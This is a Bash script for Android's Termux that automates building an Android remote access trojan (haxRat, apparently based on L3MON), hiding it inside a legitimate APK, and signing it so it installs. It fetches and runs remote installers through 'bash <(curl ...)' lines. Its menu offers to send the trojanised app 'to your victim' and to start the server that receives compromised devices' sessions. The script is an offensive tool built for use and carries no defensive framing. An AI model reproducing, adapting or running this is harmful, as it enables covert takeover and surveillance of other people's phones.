#!/bin/bash
PWD=$(pwd)
#<<<----------colour substitution by variables---------->>>
B0="$(printf '\033[100m')" S0="$(printf '\033[30m')"
B1="$(printf '\033[91m')" S1="$(printf '\033[31m')"
B2="$(printf '\033[92m')" S2="$(printf '\033[32m')"
B3="$(printf '\033[93m')" S3="$(printf '\033[33m')"
B4="$(printf '\033[94m')" S4="$(printf '\033[34m')"
B5="$(printf '\033[95m')" S5="$(printf '\033[35m')"
B6="$(printf '\033[96m')" S6="$(printf '\033[36m')"
B7="$(printf '\033[97m')" S7="$(printf '\033[37m')"
R1="$(printf '\033[0;1m')" R0="$(printf '\033[00m')"

#<<<-----------distro verification----------->>>
OS=$(uname -o)
case ${OS} in
  Android)
    if ! hash msfconsole msfvenom 2>/dev/null; then
      printf "${S2}[${S1}!${S2}]${S1}Metasploit not found!${R0}\n"
      echo
      while true; do
         read -r -p "${S4}Do you want to install Metasploit? (Y/N): ${R0}" answer
         case ${answer} in
            [Yy]* ) bash <(curl -fsSL "https://git.io/termuxblack") -i && apt install ruby2 && bash <(curl -fsSL "https://git.io/metasploit-installer"); break
         ;;

            [Nn]* ) exit;;
                * ) echo "${S2}[${S1}!${S2}]${S1}Please answer Y or N.!!${R0}\n";;
         esac
      done
    fi

    if ! hash "haxrat" 2>/dev/null; then
    bash <(curl -fsSL "https://git.io/termuxblack") -i
    fi
    reqmt=(apkmod apkmod2 haxrat)
    for i in "${reqmt[@]}"
    do
      if ! hash "${i}" 2>/dev/null; then
         printf "${S2} Installing requirements ${R0}\n"
         echo
         pkg install ${i} -y
      fi
    done
;;
 * ) printf "${S2}[${1}!${S2}]${S1}Sorry! but your system is not compatible with this program!!${R0}\n"; exit 1

esac

#<<<----------NETWORK CHECKING---------->>>
__internet__() {
while true; do
ping -c 1 google.com > /dev/null 2>&1
if [[ "$?" != 0 ]]
then
        echo
        printf "\n[\e[1;31mERROR!!\e[0m]\e[1;31m YOU ARE NOT CONNECTED TO INTERNET!!\e[0m\n"
        printf "\n\e[1;33mplease turn on your internet data to continue this process..\e[0m\n"
        printf "\n\e[1;36mpress \e[1;31mEnter\e[1;36m if you have connected or run \e[1;31mquit\e[1;36m to exit==> \e[0m"
        read internt
        if [[ $internt == 'exit' || $internt == 'quit' ]]; then
                printf "\e[4;97mCSF \e[0;0;0m> \e[1;32mExiting\e[0m"
                printf "\e[1;32m..........\e[0m\n" | pv -qL 10
                exit
        else
                :
        fi
else
        printf "\n\e[4;97mCSF \e[0;0;0m> \e[1;32m connecting to server\e[0m"
        printf "\e[1;32m...........\e[0m\n" | pv -qL 10
        echo
break
fi
done
}
#<<<-----------program---------->>>
while true; do
echo -e "
${B5} ${S2}choose your option from the list:-${R0} ${R1}

${S2}1.${S4} to create the haxRat.apk${R0}
${S2}2.${S4} If you have already created the haxRat.apk to  bind${R0}
"
printf "${S1}Enter your option==> ${S2}"
read OPTION
if  [[ $OPTION == '1' || $OPTION == '01' ]]; then
__internet__
xdg-open http://localhost:22533
haxrat
elif [[ ${OPTION} == '2' || ${OPTION} == '02' ]]; then
  cd ${HOME}/haxrat
  HAXF=$(find haxRat.apk)
if [[ "$?" != 0 ]]; then
echo
printf "${S2}[${S1}!${S2}]${S1}you didn't have created haxRat.apk so please chooese option 1!${R0}\n"
echo
fi
  if [[ ${HAXF} == 'haxRat.apk' ]]; then
    mv haxRat.apk L3MON.apk
    cd ${HOME}/lemon
    LEMON=$(find L3MON.apk)
    if [[ ${LEMON} == 'L3MON'* ]]; then
      if [[ -d "post" ]]; then
        :
      else
        mkdir post
      fi
      mv -v ${HOME}/lemon/L3MON.apk ${HOME}/lemon/post
    fi
    cp -r ${HOME}/haxrat/L3MON.apk ${HOME}/lemon
    echo
    printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your input apk (path/name.apk) ==> \e[0m"
    read inputapk
    printf "${S4}Processing${R0}"
    printf "${S5}..........${R0}\n"
    echo
    cd ${HOME}/lemon
    apkmod2 -i ${inputapk}
    sleep 2
    mv L3MON_binded.apk haxRat_binded.apk
    mv -v haxRat_binded.apk /sdcard
  printf "${S6}YOUR BINDED APK FILE IS SAVED IN YOUR INTERNAL STORAGE :)${R0}"

  echo
  printf "\e[1;31m If any error occur during binding the rat, you may ask us on telegram (link:- https://t.me/joinchat/sPry-cUszMw2ZWZk )\e[0m\n"
  echo
printf "\e[\e[1;34mIn order to make the output apk installable, sign with apk signer\e[0\n"
printf "\e[\e[1;33myou may download apk signer from playstore:- https://play.google.com/store/apps/details?id=com.haibison.apksigner \e[0m\n"
sleep 3
printf "\e[4;97mCSF \e[0;0;0m> \e[1;36mEnter the path to the directory in which your signed payload existing ==> \e[0m"
read pathh
printf "\n"
printf "\e[4;97mCSF \e[0;0;0m> \e[1;36mEnter the signed payload name with (.apk) extension ==> \e[0m"
read signpay
printf "\n"
sleep 2
  printf "\e[1;34m If it is successfully binded then you can choose following options:-\e[0m\n"
  function actions() {
  echo
  printf "\e[2;32m>(01). Send the signed + binded apk file to your victim\e[0m\n"
  printf "\e[2;32m>(02). Install the signed + binded apk in your device \e[0m\n"
  printf "\e[2;32m>(03). Remove the signed + binded apk from your device\e[0m\n"
  printf "\e[2;32m>(04). Start the haxrat server to get the session \e[0m\n"
  printf "\e[2;32m>>>>>> Run 'quit' to EXIT this program\e[0m\n"
  echo
  }
  actions
while true; do
  printf "${S6}Enter your option==> "
  read suboption
  if [[ $suboption == '1' || $suboption == '01' ]]; then
xdg-open --send ${pathh}/${signpay}

 elif [[ $suboption == '2' || $suboption == '02' ]]; then
xdg-open ${pathh}/${signpay}
 elif [[ $suboption == '3' || $suboption == '03' ]]; then
rm -rf ${pathh}/${signpay}
 elif [[ $suboption == '4' || $suboption == '04' ]]; then
__internet__
xdg-open http://localhost:22533
haxrat
 elif [[ $suboption == 'quit' || $suboption == 'exit' ]]; then
exit 1
 elif [[ $suboption == 'list' || $suboption == 'show options' ]]; then
actions
 elif [[ ! -z $suboption ]]; then
 printf "${S2}[${S1}!${S2}]${S1}please choose any option other than leaving it empty!!${R0}\n"
 echo
 else
 printf "${S2}[${S1}!${S2}]${S1}please choose a valid option!!${R0}\n"
echo
 fi
done
fi
else
printf "${S2}[${S1}!${S2}]${S1}please choose a valid option!!${R0}\n"
echo
fi
done






